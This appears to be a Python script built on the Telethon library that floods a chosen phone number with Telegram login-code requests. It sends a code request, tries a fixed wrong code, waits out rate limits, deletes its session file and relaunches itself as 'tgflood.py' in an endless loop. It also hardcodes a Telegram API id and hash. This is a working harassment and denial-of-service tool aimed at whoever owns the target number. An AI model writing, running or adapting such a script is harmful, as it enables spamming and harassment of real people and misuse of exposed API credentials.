from telethon.sync import TelegramClient
from telethon.errors import PhoneCodeInvalidError, FloodWaitError, SessionPasswordNeededError
from time import sleep
import os

GREEN = '\033[32m'
YELLOW = '\033[33m'
RESET = '\033[0m'
BLUE = '\033[34m'
RED = '\033[31m'

api_id = 10953300
api_hash = '9c24426e5d6fa1d441913e3906627f87'
session = "tg"

phone_number = 'RAQAMGA_OZGARTIRING'

def main():
    client = TelegramClient(session, api_id, api_hash)
    client.connect()

    if not client.is_user_authorized():
        phone_code_hash = None
        for attempt in range(5):
            try:
                result = client.send_code_request(phone_number)
                phone_code_hash = result.phone_code_hash
                print(f"{BLUE}[~] Sorov yuborildi =>{GREEN} {phone_number}{RESET}")

                code = '12345'
                client.sign_in(phone_number, code, phone_code_hash=phone_code_hash)
                print("{YELLOW}[~] Muvaffaqiyatli tizimga kirildi!{RESET}")
                return

            except PhoneCodeInvalidError:
                print("[~] Qayta so'rov yuborilmoqda...")

                continue

            except FloodWaitError as e:
                print(f"[~] {e} {RED} Limitga yetdi, limit tugashi kutilmoqda...{RESET}")
                sleep(e.seconds)

            except SessionPasswordNeededError:
                print("{BLUE}[~] 2FA yoqilgan...{RESET}")
                break

            except Exception as e:
                print(f"{YELLOW}[~] {e} {RESET}")
                break

    else:
        print("{BLUE}[~] Allaqachon ruxsat berilgan.{RESET}")

    if os.path.exists(f"{session}.session"):
        os.remove(f"{session}.session")

    os.system("python tgflood.py")

if __name__ == "__main__":
    main()
